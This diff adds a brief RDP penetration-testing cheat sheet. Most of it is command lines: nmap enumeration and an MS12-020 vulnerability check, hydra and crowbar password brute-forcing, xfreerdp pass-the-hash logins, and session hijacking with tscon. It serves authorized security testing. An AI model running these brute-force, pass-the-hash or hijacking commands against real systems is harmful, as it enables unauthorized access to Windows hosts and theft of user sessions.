@@ -1,0 +1,53 @@
+==============================
+RDP (Remote Desktop Protocol)
+Cheat Sheet – Professional
+==============================
+
+PORT:
+3389/TCP – RDP (default)
+Custom ports common
+
+Transport:
+TCP / UDP
+
+Purpose:
+Remote GUI access to Windows systems
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p3389 -sV <IP>
+nmap -p3389 --script rdp-* <IP>
+nmap -p3389 --script rdp-ntlm-info <IP>
+
+rdp-sec-check.pl <IP>
+nmap --script rdp-ntlm-info -p3389 <IP>
+
+# Valid user check (NLA off)
+xfreerdp /v:<IP> /u:test /p:test
+
+hydra -L users.txt -P passwords.txt rdp://<IP>
+crowbar -b rdp -s <IP>/32 -u user -C passwords.txt
+
+xfreerdp /v:<IP> /u:user /pth:<NTLM_HASH>
+xfreerdp /v:<IP> /u:user /p:password
+xfreerdp /v:<IP> /u:domain\\user /p:password
+xfreerdp /v:<IP> /u:user /p:pass +clipboard +drives
+
+nmap --script rdp-vuln-ms12-020 -p3389 <IP>
+searchsploit rdp
+
+query user
+tscon <ID> /dest:console
+
+Event Viewer:
+Security Logs
+Microsoft-Windows-TerminalServices-*
+
+nmap
+xfreerdp
+hydra
+crowbar
+metasploit
+searchsploit
